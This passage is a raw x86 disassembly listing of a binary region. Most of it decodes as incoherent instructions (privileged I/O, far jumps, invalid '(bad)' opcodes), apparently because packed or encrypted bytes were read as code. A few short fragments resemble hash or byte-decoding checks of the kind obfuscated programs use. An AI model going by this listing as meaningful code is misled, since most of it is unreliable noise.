  40ac92:	fdivr  QWORD PTR [ecx]
  40ac94:	mov    ds:0x913275a5,al
  40ac99:	jnp    0x40ad19
  40ac9b:	sbb    DWORD PTR [ebx+esi*8],eax
  40ac9e:	jmp    DWORD PTR [ebx]
  40aca0:	popa   
  40aca1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aca2:	add    DWORD PTR [edx+0x4e],edx
  40aca5:	out    0xc,eax
  40aca7:	jns    0x40ac9c
  40aca9:	mov    ch,0xe5
  40acab:	sub    dh,BYTE PTR [edx-0x26]
  40acae:	dec    edi
  40acaf:	and    esi,DWORD PTR [eax+0x4da13816]
  40acb5:	ror    esp,1
  40acb7:	mov    ds:0x8569852b,al
  40acbc:	mov    ah,0x2c
  40acbe:	cmp    ecx,DWORD PTR [eax+0x4]
  40acc1:	test   BYTE PTR [ebx+0x29],al
  40acc4:	add    bl,BYTE PTR ss:[ecx+0xf]
  40acc8:	jge    0x40ad3f
  40acca:	call   DWORD PTR [edi+0x5f37663c]
  40acd0:	cmp    esp,DWORD PTR [eax+0x27]
  40acd3:	test   eax,0xa5cc2929
  40acd8:	xor    edx,DWORD PTR [ebx]
  40acda:	icebp  
  40acdb:	or     al,0x94
  40acdd:	xor    esi,DWORD PTR [edi-0x73]
  40ace0:	xor    ah,BYTE PTR [esi-0x2e]
  40ace3:	add    al,0xff
  40ace5:	out    0xfd,al
  40ace7:	test   al,0xb7
  40ace9:	mov    ah,al
  40aceb:	jnp    0x40accb
  40aced:	out    0x39,al
  40acef:	imul   DWORD PTR [ebx+0x4f]
  40acf2:	shl    DWORD PTR [ebx],cl
  40acf4:	pop    edi
  40acf5:	cmp    DWORD PTR [ebp-0x23bedab6],eax
  40acfb:	inc    eax
  40acfc:	push   esp
  40acfd:	addr16 mov esi,0x8d252c49
  40ad03:	cmp    DWORD PTR [eax-0xd110654],edx
  40ad09:	outs   dx,BYTE PTR ds:[esi]
  40ad0a:	das    
  40ad0b:	xchg   BYTE PTR [ebx+0x5cfaaf02],dl
  40ad11:	jb     0x40acfe
  40ad13:	or     DWORD PTR [ebx-0x4cbcbc1c],esp
  40ad19:	imul   edi,edi,0x54
  40ad1c:	and    DWORD PTR [ebx+edx*4+0x1e381b17],0xebe2aff1
  40ad27:	jno    0x40ad10
  40ad29:	test   eax,0x33084874
  40ad2e:	pusha  
  40ad2f:	mov    ecx,0x18adb6a3
  40ad34:	inc    ebp
  40ad35:	sbb    BYTE PTR [edi],al
  40ad37:	int    0xa6
  40ad39:	add    eax,ecx
  40ad3b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ad3e:	mov    ecx,DWORD PTR [ecx]
  40ad40:	mov    eax,DWORD PTR [eax+ecx*1]
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi+0x54fa95c7]
  40ad81:	jo     0x40ad83
  40ad83:	repz jle 0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	or     ebp,edi
  40ad8c:	and    al,0x2
  40ad8e:	xchg   esp,eax
  40ad8f:	bound  ebp,QWORD PTR [ecx]
  40ad91:	xor    bl,bh
  40ad93:	cli    
  40ad94:	push   cs
  40ad95:	in     eax,0x87
  40ad97:	loope  0x40add7
  40ad99:	mov    edx,0x154577e5
  40ad9e:	shl    DWORD PTR [edx],cl
  40ada0:	(bad)  
  40ada1:	hlt    
  40ada2:	in     eax,dx
  40ada3:	jae    0x40ad4a
  40ada5:	and    ah,BYTE PTR [edi]
  40ada7:	dec    esp
  40ada8:	cmp    DWORD PTR [esi+0x27],0xf6b95a7
  40adaf:	cmp    edi,DWORD PTR ds:0x5b417e5b
  40adb5:	xchg   esi,eax
  40adb6:	push   ecx
  40adb7:	jno    0x40ad8d
  40adb9:	xchg   ebx,eax
  40adba:	in     al,dx
  40adbb:	pop    ecx
  40adbc:	adc    cl,BYTE PTR [edi+0x312666be]
  40adc2:	ja     0x40add8
  40adc4:	in     al,0x6c
  40adc6:	xchg   ebp,eax
  40adc7:	call   0x3498:0x19323bbd
  40adce:	pop    ecx
  40adcf:	push   edx
  40add0:	neg    BYTE PTR [ecx-0x8]
  40add3:	push   es
  40add4:	in     eax,0xfb
  40add6:	pop    edi
  40add7:	pop    ebp
  40add8:	and    eax,0x6e
  40addb:	mov    eax,ds:0xee8e82ae
  40ade0:	daa    
  40ade1:	add    esi,0x97e194d9
  40ade7:	test   DWORD PTR ds:0x349469b6,eax
  40aded:	data16 lahf 
  40adef:	std    
  40adf0:	adc    al,0x1c
  40adf2:	ror    BYTE PTR [edx],1
  40adf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adf5:	xor    al,0x2f
  40adf7:	push   cs
  40adf8:	dec    ecx
  40adf9:	fwait
  40adfa:	push   ecx
  40adfb:	jmp    DWORD PTR [edx-0x4ef79bdb]
  40ae01:	add    ebp,ebx
  40ae03:	adc    cl,BYTE PTR [edx]
  40ae05:	xchg   edx,eax
  40ae06:	es stos BYTE PTR es:[edi],al
  40ae08:	lock (bad) 
  40ae0a:	test   DWORD PTR [esi],0xb18571a
  40ae10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae11:	jl     0x40ae06
  40ae13:	cwde   
  40ae14:	mov    DWORD PTR [edi+0xf],esi
  40ae17:	mov    eax,0xe1d4b99a
  40ae1c:	mov    al,0x61
  40ae1e:	xchg   ecx,eax
  40ae1f:	mov    esi,0xdc68ed05
  40ae24:	pop    ebp
  40ae25:	fiadd  WORD PTR [edi-0x34a69bb5]
  40ae2b:	jnp    0x40ae32
  40ae2d:	and    esp,DWORD PTR [ecx]
  40ae2f:	stos   DWORD PTR es:[edi],eax
  40ae30:	adc    al,0x41
  40ae32:	test   DWORD PTR [ebx],eax
  40ae34:	sar    DWORD PTR [eax-0x3],cl
  40ae37:	dec    ebp
  40ae38:	fwait
  40ae39:	mov    bh,0xff
  40ae3b:	das    
  40ae3c:	mov    es,eax
  40ae3e:	hlt    
  40ae3f:	(bad)  
  40ae40:	icebp  
  40ae41:	cmp    ebp,esi
  40ae43:	fdiv   QWORD PTR [edx-0x71]
  40ae46:	mov    bl,0xa8
  40ae48:	rol    BYTE PTR [esi-0x50],1
  40ae4b:	push   cs
  40ae4c:	fadd   DWORD PTR [esi-0x5d]
  40ae4f:	leave  
  40ae50:	xchg   esp,eax
  40ae51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae52:	scas   eax,DWORD PTR es:[edi]
  40ae53:	ret    
  40ae54:	cmp    bh,dl
  40ae56:	mov    bh,0xe4
  40ae58:	jg     0x40ae95
  40ae5a:	jnp    0x40ae67
  40ae5c:	push   eax
  40ae5d:	je     0x40ae7c
  40ae5f:	or     al,0x86
  40ae61:	shl    dh,cl
  40ae63:	dec    esi
  40ae64:	cmp    BYTE PTR [edi],bl
  40ae66:	dec    eax
  40ae67:	icebp  
  40ae68:	jmp    0x40ae52
  40ae6a:	aas    
  40ae6b:	fiadd  WORD PTR [ebp+0x41e4a213]
  40ae71:	popa   
  40ae72:	into   
  40ae73:	sbb    eax,0xac1887d8
  40ae78:	or     BYTE PTR [edi-0x72],ah
  40ae7b:	xor    DWORD PTR [ebx+0x93bd9da],edi
  40ae81:	nop
  40ae82:	jl     0x40ae87
  40ae84:	add    BYTE PTR [eax+0x7a],ch
  40ae87:	pushf  
  40ae88:	cwde   
  40ae89:	ret    
  40ae8a:	mov    al,0x5
  40ae8c:	mov    ch,0xf3
  40ae8e:	mov    ?,esi
  40ae90:	cmp    BYTE PTR [ebx+0x6e847458],dl
  40ae96:	and    dl,BYTE PTR [edx+0x32]
  40ae99:	fist   DWORD PTR [eax-0x68f29792]
  40ae9f:	add    esp,ebx
  40aea1:	sub    al,0x53
  40aea3:	lea    ecx,[ebp-0x5d1e31ce]
  40aea9:	xchg   ecx,eax
  40aeaa:	mov    ah,0x48
  40aeac:	mul    DWORD PTR [ebx+0xb]
  40aeaf:	in     eax,dx
  40aeb0:	in     eax,0x5a
  40aeb2:	push   edx
  40aeb3:	out    0x93,al
  40aeb5:	jp     0x40ae4d
  40aeb7:	cli    
  40aeb8:	retf   0x3e4b
  40aebb:	aam    0x54
  40aebd:	pop    ds
  40aebe:	(bad)  [ebp+edi*2-0x6a]
  40aec2:	test   eax,0xd233c139
  40aec7:	pop    edi
  40aec8:	test   al,0x40
  40aeca:	les    ecx,FWORD PTR [edi+ebp*8-0x54]
  40aece:	pop    ebp
  40aecf:	dec    bl
  40aed1:	into   
  40aed2:	out    dx,al
  40aed3:	loope  0x40aebc
  40aed5:	int3   
  40aed6:	mov    esp,0xff116aab
  40aedb:	xchg   edi,eax
  40aedc:	dec    ebp
  40aedd:	lods   al,BYTE PTR ds:[esi]
  40aede:	test   eax,0xc4a9b10e
  40aee3:	sub    DWORD PTR [ecx-0x1e],ebp
  40aee6:	sbb    DWORD PTR [esi],esi
  40aee8:	stos   BYTE PTR es:[edi],al
  40aee9:	push   ecx
  40aeea:	retf   
  40aeeb:	aad    0x95
  40aeed:	test   DWORD PTR [edx],0xdaadab53
  40aef3:	into   
  40aef4:	lahf   
  40aef5:	loopne 0x40af00
  40aef7:	clc    
  40aef8:	xchg   edx,eax
  40aef9:	shl    cl,0x7b
  40aefc:	sbb    eax,0x930b9678
  40af01:	lea    ebx,ds:0xa8290b9
  40af07:	jg     0x40aed9
  40af09:	or     al,0x4c
  40af0b:	(bad)  
  40af0d:	mov    bh,BYTE PTR [edi]
  40af0f:	rcl    BYTE PTR ds:0xc9823235,cl
  40af15:	xor    DWORD PTR ds:0x65dfaaaa,eax
  40af1b:	pop    edx
  40af1c:	or     al,0xce
  40af1e:	icebp  
  40af1f:	imul   eax,DWORD PTR [ecx],0xb0f75584
  40af25:	sbb    DWORD PTR [edi+0x4c6afe9b],edi
  40af2b:	dec    ebp
  40af2c:	adc    BYTE PTR [edi],0x99
  40af2f:	out    0xc5,al
  40af31:	nop
  40af32:	sbb    DWORD PTR [edx-0x44792d7],ebx
  40af38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af39:	xor    bh,BYTE PTR [ebp+edx*4+0x66703a60]
  40af40:	pop    eax
  40af41:	in     al,0xc6
  40af43:	rcr    ebx,0xf7
  40af46:	daa    
  40af47:	cdq    
  40af48:	popa   
  40af49:	add    BYTE PTR [edx+eiz*2],0x8f
  40af4d:	ficom  DWORD PTR [edi+0x60]
  40af50:	add    dh,BYTE PTR [ebp+0x7679bfb]
  40af56:	jae    0x40af6f
  40af58:	ret    
  40af59:	cmp    BYTE PTR [eax],ah
  40af5b:	in     eax,0x26
  40af5d:	and    eax,0xb35ae2a1
  40af62:	and    ch,ah
  40af64:	retf   
  40af65:	(bad)  
  40af66:	ss jmp 0xe12b:0x57e1fc7a
  40af6e:	(bad)  
  40af6f:	fist   WORD PTR [eax+0x1a2cd66d]
  40af75:	pushf  
  40af76:	inc    edi
  40af77:	(bad)  
  40af78:	or     al,0xad
  40af7a:	push   ebp
  40af7b:	xor    bl,0xf5
  40af7e:	xor    dl,BYTE PTR [ebp-0x7eb517a5]
  40af84:	mov    es,WORD PTR [ebp+0x15]
  40af87:	lahf   
  40af88:	cmp    DWORD PTR ds:0x2204fc60,0x37
  40af8f:	pop    eax
  40af90:	adc    ah,dh
  40af92:	sbb    DWORD PTR [eax+esi*8-0x1f],ebp
  40af96:	adc    al,0xe9
  40af98:	mov    edi,0x4f86c23e
  40af9d:	cmc    
  40af9e:	mov    ds:0x6d35f47b,eax
  40afa3:	addr16 cdq 
  40afa5:	inc    ebx
  40afa6:	cmp    BYTE PTR [edx],dh
  40afa8:	fcomi  st,st(5)
  40afaa:	jnp    0x40af47
  40afac:	dec    eax
  40afad:	out    dx,al
  40afae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afaf:	xchg   ebp,eax
  40afb0:	mov    WORD PTR [esi],gs
  40afb2:	out    0x8b,eax
  40afb4:	or     edi,ebx
  40afb6:	ja     0x40afb8
  40afb8:	sbb    eax,0x3fc7d351
  40afbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afbe:	test   al,0xa6
  40afc0:	push   ebx
  40afc1:	test   BYTE PTR [eax-0x7a],0x4c
  40afc5:	iret   
  40afc6:	ret    0xf0be
  40afc9:	add    DWORD PTR [ecx],0x2c
  40afcc:	mov    edi,0xe1173691
  40afd1:	(bad)  [ecx-0xd686b9]
  40afd7:	xor    al,0x75
  40afd9:	mov    edi,0x31886fa
  40afde:	add    DWORD PTR [ebx],esp
  40afe0:	mov    ds:0x4d4998fe,eax
  40afe5:	sar    DWORD PTR [ebx],0x79
  40afe8:	ss out dx,eax
  40afea:	in     al,dx
  40afeb:	inc    eax
  40afec:	aaa    
  40afed:	jmp    0x40b04c
  40afef:	push   esi
  40aff0:	inc    esi
  40aff1:	xchg   ebp,eax
  40aff2:	fbstp  TBYTE PTR [esp+eiz*2]
  40aff5:	mov    edi,0x8cfe3b99
  40affa:	pusha  
  40affb:	out    dx,eax
  40affc:	shl    bh,cl
  40affe:	sbb    cl,0xe6
  40b001:	ss adc eax,0xd6a023be
  40b007:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b008:	les    eax,FWORD PTR ss:[edx]
  40b00b:	adc    eax,0x381dd512
  40b010:	pop    ebx
  40b011:	inc    eax
  40b012:	inc    ebp
  40b013:	mov    eax,ebx
  40b015:	add    BYTE PTR [edi+0xdfbf9f],ah
  40b01b:	mov    ah,0x4f
  40b01d:	pop    es
  40b01e:	pop    esp
  40b01f:	mov    edi,0xb87c4f82
  40b024:	add    BYTE PTR [esi+0x7e],0xd8
  40b028:	fnstsw WORD PTR [ebx+ebp*1-0x39953ee1]
  40b02f:	imul   eax,DWORD PTR ds:0x33bc2825,0xc7f43bee
  40b039:	pop    ebp
  40b03a:	pop    ss
  40b03b:	outs   dx,BYTE PTR ds:[esi]
  40b03c:	cmp    dh,0x5f
  40b03f:	push   ss
  40b040:	xchg   edx,eax
  40b041:	mov    ds:0x8503b697,al
  40b046:	test   eax,0x841340ef
  40b04b:	push   edi
  40b04c:	xor    DWORD PTR [ecx],edi
  40b04e:	rcr    DWORD PTR [ebx+0x2],0x9d
  40b052:	es paddw mm4,mm1
  40b056:	dec    ebp
  40b057:	mov    DWORD PTR [ebp+0x20f7b05a],esp
  40b05d:	test   BYTE PTR [ebx-0x1a],dh
  40b060:	sub    ch,BYTE PTR [ebp+0x2d]
  40b063:	jb     0x40b07f
  40b065:	sub    DWORD PTR [esi+ebx*1+0x6d14f6a9],ebx
  40b06c:	(bad)  
  40b06d:	int    0xc0
  40b06f:	lds    edi,FWORD PTR [ecx-0x73]
  40b072:	xlat   BYTE PTR ds:[ebx]
  40b073:	(bad)  
  40b074:	out    dx,al
  40b075:	inc    ebx
  40b076:	stc    
  40b077:	into   
  40b078:	push   edx
  40b079:	aam    0xf6
  40b07b:	mov    eax,0xa585b437
  40b080:	(bad)  
  40b081:	ds mov bh,dh
  40b084:	icebp  
  40b085:	scas   eax,DWORD PTR es:[edi]
  40b086:	(bad)  
  40b087:	cmp    DWORD PTR [edi+0x4bf30cbf],edi
  40b08d:	in     al,0x8b
  40b08f:	inc    ebp
  40b090:	loopne 0x40b01d
  40b092:	dec    ebp
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	pop    edx
  40b0ba:	in     eax,dx
  40b0bb:	add    edx,DWORD PTR [edi]
  40b0bd:	or     al,0xfe
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	inc    ebx
  40b0c6:	lods   al,BYTE PTR ds:[esi]
  40b0c7:	idiv   edi
  40b0c9:	jnp    0x40b0b6
  40b0cb:	sub    ecx,esi
  40b0cd:	adc    BYTE PTR [esp+esi*1+0x64d5979],cl
  40b0d4:	iret   
  40b0d5:	test   eax,0xdb78dc9b
  40b0da:	fiadd  WORD PTR [edi-0x2970e5ca]
  40b0e0:	cwde   
  40b0e1:	rol    BYTE PTR [ebx],0xe8
  40b0e4:	sub    al,0x95
  40b0e6:	sbb    edi,DWORD PTR [ebx]
  40b0e8:	ror    ecx,1
  40b0ea:	push   eax
  40b0eb:	mov    cl,BYTE PTR [edi+0x1]
  40b0ee:	aas    
  40b0ef:	adc    edi,DWORD PTR [ebp-0x11553190]
  40b0f5:	cmp    edx,edx
  40b0f7:	imul   esi,DWORD PTR [ebp-0x19],0xb291b240
  40b0fe:	mov    ah,0x32
  40b100:	das    
  40b101:	xchg   ebp,eax
  40b102:	out    dx,eax
  40b103:	pop    es
  40b104:	cli    
  40b105:	jns    0x40b143
  40b107:	adc    BYTE PTR [edx],al
  40b109:	outs   dx,BYTE PTR ds:[esi]
  40b10a:	das    
  40b10b:	add    dl,dh
  40b10d:	adc    DWORD PTR [eax+0x25934b05],ecx
  40b113:	inc    esi
  40b114:	xchg   ecx,eax
  40b115:	xchg   esp,eax
  40b116:	mov    edi,0x230e3756
  40b11b:	div    DWORD PTR [edx-0x710400ec]
  40b121:	test   eax,0x73797dc5
  40b126:	and    bh,0x6
  40b129:	push   es
  40b12a:	adc    eax,0x6012d083
  40b12f:	std    
  40b130:	out    dx,al
  40b131:	out    dx,al
  40b132:	mov    ah,0x50
  40b134:	mov    al,0xa0
  40b136:	and    DWORD PTR [esi],edi
  40b138:	ret    
  40b139:	outs   dx,BYTE PTR ds:[esi]
  40b13a:	and    eax,0xf7246d9d
  40b13f:	pop    ebp
  40b140:	(bad)  
  40b141:	cli    
  40b142:	ror    BYTE PTR [ebp+0x2374824a],0xa8
  40b149:	pop    edx
  40b14a:	or     DWORD PTR [ebp-0x7d9e09e1],eax
  40b150:	fmul   DWORD PTR [esi-0x34359585]
  40b156:	jbe    0x40b17b
  40b158:	(bad)  
  40b15a:	dec    ebp
  40b15b:	ins    BYTE PTR es:[edi],dx
  40b15c:	mov    dh,0x45
  40b15e:	sbb    eax,0xa4e87c47
  40b163:	jns    0x40b1a6
  40b165:	stos   DWORD PTR es:[edi],eax
  40b166:	push   esi
  40b167:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b168:	scas   al,BYTE PTR es:[edi]
  40b169:	mov    dl,bl
  40b16b:	add    BYTE PTR [edx+0x60],bl
  40b16e:	adc    cl,bh
  40b170:	mov    ebp,0x9817c04
  40b175:	cld    
  40b176:	rep outs dx,DWORD PTR ds:[esi]
  40b178:	push   esi
  40b179:	pop    es
  40b17a:	push   DWORD PTR [ebx+0x75]
  40b17d:	loop   0x40b161
  40b17f:	sbb    eax,0xad2c5ebc
  40b184:	mov    cl,0xde
  40b186:	(bad)  
  40b187:	sbb    eax,0xa405e56
  40b18c:	cli    
  40b18d:	pop    ebx
  40b18e:	and    DWORD PTR [edi+0x3b],edi
  40b191:	cld    
  40b192:	mov    WORD PTR [eax],?
  40b194:	xor    eax,0xb6727c3a
  40b199:	jle    0x40b1da
  40b19b:	test   DWORD PTR [bx+di+0x2a],0x1de6187e
  40b1a3:	dec    edx
  40b1a4:	das    
  40b1a5:	clc    
  40b1a6:	xchg   ebp,eax
  40b1a7:	bound  edx,QWORD PTR [ebx]
  40b1a9:	outs   dx,DWORD PTR ds:[esi]
  40b1aa:	mov    esi,0x1e4ad12b
  40b1af:	or     al,0x54
  40b1b1:	aad    0x8a
  40b1b3:	or     dh,BYTE PTR [eax-0x1f]
  40b1b6:	inc    esp
  40b1b7:	xchg   edi,eax
  40b1b8:	jae    0x40b1a0
  40b1ba:	pop    ebp
  40b1bb:	ret    
  40b1bc:	gs pushf 
  40b1be:	pop    edx
  40b1bf:	push   ds
  40b1c0:	cmc    
  40b1c1:	xchg   esi,eax
  40b1c2:	add    BYTE PTR [esi-0x8],bl
  40b1c5:	mov    dh,0x5c
  40b1c7:	retf   0x4052
  40b1ca:	inc    esp
  40b1cb:	loopne 0x40b1f2
  40b1cd:	inc    ebx
  40b1ce:	jae    0x40b21b
  40b1d0:	jmp    0x194:0x75654ab6
  40b1d7:	lds    edi,FWORD PTR [edx+0x6b]
  40b1da:	mov    ecx,0xa82c21fe
  40b1e0:	in     eax,0x45
  40b1e2:	fdivrp st(0),st
  40b1e4:	xchg   ecx,eax
  40b1e5:	mov    dl,0x24
  40b1e7:	push   ds
  40b1e8:	cli    
  40b1e9:	inc    ecx
  40b1ea:	jbe    0x40b1a0
  40b1ec:	ror    BYTE PTR [edx],0xbb
  40b1ef:	pusha  
  40b1f0:	test   BYTE PTR [edi-0x68],0x8
  40b1f4:	inc    eax
  40b1f5:	push   ecx
  40b1f6:	adc    ecx,DWORD PTR [esi-0x72]
  40b1f9:	sbb    BYTE PTR [ebx+eiz*4],ch
  40b1fc:	jmp    0x40b26f
  40b1fe:	mov    eax,ds:0x7dc5e7ef
  40b203:	inc    ebx
  40b204:	inc    edi
  40b205:	xor    edx,ecx
  40b207:	xchg   esi,eax
  40b208:	repz mov bh,0x5e
  40b20b:	sbb    BYTE PTR [ebp-0x4dccc264],cl
  40b211:	bound  ebp,QWORD PTR [eax]
  40b213:	fisub  DWORD PTR [eax-0x1d]
  40b216:	mov    eax,0x2cdf737
  40b21b:	fcmovnb st,st(3)
  40b21d:	sub    eax,0x3f396e1b
  40b222:	(bad)  
  40b223:	sti    
  40b224:	std    
  40b225:	les    ecx,FWORD PTR [ecx]
  40b227:	jg     0x40b274
  40b229:	inc    esi
  40b22a:	mov    esi,0x9f09ff6e
  40b22f:	inc    ebp
  40b230:	enter  0xd05a,0x9
  40b234:	xchg   esi,eax
  40b235:	push   ecx
  40b236:	out    dx,eax
  40b237:	(bad)  
  40b238:	scas   eax,DWORD PTR es:[edi]
  40b239:	jnp    0x40b251
  40b23b:	jg     0x40b1d0
  40b23d:	mov    BYTE PTR [eax+0xbf97590],cl
  40b243:	dec    esp
  40b244:	loop   0x40b261
  40b246:	jb     0x40b261
  40b248:	out    0xb9,eax
  40b24a:	fisttp DWORD PTR [eax]
  40b24c:	xor    eax,0x76ee4d60
  40b251:	add    al,0x31
  40b253:	mov    ?,WORD PTR [ebp+0x74a3d310]
  40b259:	sar    BYTE PTR [ebx-0x7a4b77b5],1
  40b25f:	aam    0x41
  40b261:	mov    ecx,0x58c4b95d
  40b266:	inc    esp
  40b267:	inc    esp
  40b268:	bnd jns 0x40b25c
  40b26b:	push   eax
  40b26c:	in     al,0xd6
  40b26e:	push   cs
  40b26f:	mov    edi,0x21c900c
  40b274:	pop    eax
  40b275:	inc    edi
  40b276:	mov    bh,dl
  40b278:	in     eax,dx
  40b279:	call   0x8e89:0xbcc6e846
  40b280:	lock fs dec edx
  40b283:	neg    eax
  40b285:	rcr    BYTE PTR [edi],1
  40b287:	push   DWORD PTR [eax+0x57b0d5c7]
  40b28d:	mov    ebx,0x852dfcae
  40b292:	push   eax
  40b293:	js     0x40b2fa
  40b295:	xchg   esi,eax
  40b296:	imul   DWORD PTR [ecx]
  40b298:	ret    0xb3b5
  40b29b:	and    ecx,ecx
  40b29d:	scas   al,BYTE PTR es:[edi]
  40b29e:	sub    DWORD PTR [ecx-0x19],ebx
  40b2a1:	xor    dh,BYTE PTR [eax-0x3a7089f1]
  40b2a7:	mov    esp,0xff6d3ff9
  40b2ac:	clc    
  40b2ad:	pop    ss
  40b2ae:	fstp   DWORD PTR [edi]
  40b2b0:	(bad)  
  40b2b1:	rcl    BYTE PTR [esp+esi*8+0xdc01e7e],1
  40b2b8:	jbe    0x40b27e
  40b2ba:	aad    0x67
  40b2bc:	aam    0x5e
  40b2be:	sbb    ch,BYTE PTR [esi+0x7d]
  40b2c1:	xchg   esp,eax
  40b2c2:	out    dx,eax
  40b2c3:	mov    ds:0x555e456,eax
  40b2c8:	add    al,0xa1
  40b2ca:	fild   DWORD PTR [edi]
  40b2cc:	and    dl,BYTE PTR [ebx]
  40b2ce:	inc    eax
  40b2cf:	in     eax,dx
  40b2d0:	call   0x64f9f0e9
  40b2d5:	or     dh,BYTE PTR [ebp+0x10]
  40b2d8:	dec    edx
  40b2d9:	in     eax,dx
  40b2da:	jmp    0x65b3:0xe7d6ac4a
  40b2e1:	mov    ebp,0xabc7f39c
  40b2e6:	pop    ebp
  40b2e7:	retf   0x6292
  40b2ea:	inc    edx
  40b2eb:	mov    cl,0x2f
  40b2ed:	mov    es,WORD PTR [edx-0x5c]
  40b2f0:	in     al,dx
  40b2f1:	and    DWORD PTR [ebx-0xa],0x3069a469
  40b2f8:	pop    ebx
  40b2f9:	es xchg edx,eax
  40b2fb:	inc    ebx
  40b2fc:	sti    
  40b2fd:	push   ebp
  40b2fe:	push   edx
  40b2ff:	sub    al,0x59
  40b301:	cdq    
  40b302:	cwde   
  40b303:	and    DWORD PTR ds:[edi+0x7e07c66f],0x8868c328
  40b30e:	mov    DWORD PTR [eax+0x3c],edx
  40b311:	sub    DWORD PTR [edi+eax*1-0x625ba940],edx
  40b318:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b319:	lock xor edx,esi
  40b31c:	adc    edx,DWORD PTR [ecx+esi*4+0x71de4eb9]
  40b323:	dec    eax
  40b324:	and    bh,BYTE PTR [esi-0x2d9341dd]
  40b32a:	mov    ebp,0xc3f1d71d
  40b32f:	mov    bh,0x66
  40b331:	mov    al,ds:0xdb999a37
  40b336:	pop    esi
  40b337:	cmp    eax,0x6c10fb81
  40b33c:	arpl   di,si
  40b33e:	(bad)  
  40b33f:	ins    DWORD PTR es:[edi],dx
  40b340:	fild   WORD PTR [ebx+0x11]
  40b343:	ret    0xaec6
  40b346:	loopne 0x40b327
  40b348:	bound  esp,QWORD PTR [esi]
  40b34a:	(bad)  
  40b34b:	pushf  
  40b34c:	pop    eax
  40b34d:	sbb    BYTE PTR [edi],bh
  40b34f:	add    eax,edi
  40b351:	mov    eax,0xa2e514d6
  40b356:	lea    edi,[ebx]
  40b358:	mov    edx,0x975d725a
  40b35d:	pop    edx
  40b35e:	cmp    BYTE PTR [ebx+0x30],bh
  40b361:	push   0x4b6bf967
  40b366:	pop    ss
  40b367:	ret    0x973e
  40b36a:	daa    
  40b36b:	clc    
  40b36c:	cmc    
  40b36d:	mov    ah,0x70
  40b36f:	sbb    eax,0x7ba3bb29
  40b374:	sbb    BYTE PTR [ebx+0xc],bh
  40b377:	mov    eax,0x8e1aff06
  40b37c:	(bad)  [edi-0x152c4b73]
  40b382:	ss mov ch,0x52
  40b385:	div    edi
  40b387:	jo     0x40b399
  40b389:	cmp    edi,DWORD PTR [esi+0x29f4ec51]
  40b38f:	xor    eax,0x195aa2d8
  40b394:	addr16 inc esp
  40b396:	or     al,0x5d
  40b398:	xor    eax,0x7ac22f5f
  40b39d:	sbb    ebp,DWORD PTR [edx]
  40b39f:	nop
  40b3a0:	push   ecx
  40b3a1:	adc    al,0x6a
  40b3a3:	jmp    0xfeba:0xca547207
  40b3aa:	pop    ss
  40b3ab:	cld    
  40b3ac:	and    esi,edx
  40b3ae:	xchg   ebp,eax
  40b3af:	sub    bl,0x67
  40b3b2:	jne    0x40b399
  40b3b4:	mov    BYTE PTR [ecx-0x9e62023],bl
  40b3ba:	mov    ch,0xbd
  40b3bc:	lds    ecx,FWORD PTR [esi]
  40b3be:	pop    esp
  40b3bf:	loop   0x40b43c
  40b3c1:	mov    cl,0x87
  40b3c3:	xor    DWORD PTR [esi+0x7ee1592b],0xffffff8b
  40b3ca:	inc    ebp
  40b3cb:	or     BYTE PTR [ebx-0x39cc07b3],cl
  40b3d1:	add    eax,edi
  40b3d3:	jmp    0x40b6f4
  40b3d8:	and    eax,0x5044d49b
  40b3dd:	jno    0x40b394
  40b3df:	pop    ebx
  40b3e0:	xchg   ebp,eax
  40b3e1:	sar    eax,cl
  40b3e3:	cmp    eax,0x8bcf3deb
  40b3e8:	or     ch,bh
  40b3ea:	jle    0x40b46a
  40b3ec:	jp     0x40b46b
  40b3ee:	jle    0x40b46e
  40b3f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b3f1:	in     al,dx
  40b3f2:	mov    cl,0x42
  40b3f4:	jae    0x40b43f
  40b3f6:	add    eax,DWORD PTR [esi+eax*8]
  40b3f9:	pop    eax
  40b3fa:	jmp    0x8906984b
  40b3ff:	jmp    0x1185:0x308717b4
  40b406:	into   
  40b407:	inc    ecx
